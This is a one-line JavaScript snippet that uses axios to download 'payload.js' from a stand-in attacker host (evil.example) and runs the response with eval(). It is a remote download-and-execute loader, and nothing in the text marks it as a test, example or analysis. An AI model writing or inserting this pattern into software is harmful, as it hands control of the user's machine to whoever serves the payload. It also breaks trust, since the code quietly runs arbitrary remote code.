const axios = require('axios'); axios.get('https://evil.example/payload.js').then(r => eval(r.data));
